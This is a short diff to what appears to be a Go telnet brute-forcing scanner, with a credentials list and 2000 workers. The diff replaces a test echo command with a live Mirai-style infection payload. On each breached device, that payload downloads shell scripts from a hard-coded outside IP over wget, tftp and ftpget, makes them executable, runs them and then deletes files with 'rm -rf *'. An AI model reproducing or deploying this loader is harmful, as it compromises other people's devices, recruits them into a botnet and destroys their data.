@@ -64,7 +64,7 @@ var CREDENTIALS = []struct {
 const (
 	TELNET_TIMEOUT    = 2 * time.Second
 	MAX_WORKERS       = 2000
-	PAYLOAD           = "echo PAYLOAD_WORKING"
+	PAYLOAD           = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://152.42.212.230/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 152.42.212.230 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 152.42.212.230; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 152.42.212.230 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *"
 	STATS_INTERVAL    = 1 * time.Second
 	MAX_QUEUE_SIZE    = 100000
 	CONNECT_TIMEOUT   = 1 * time.Second
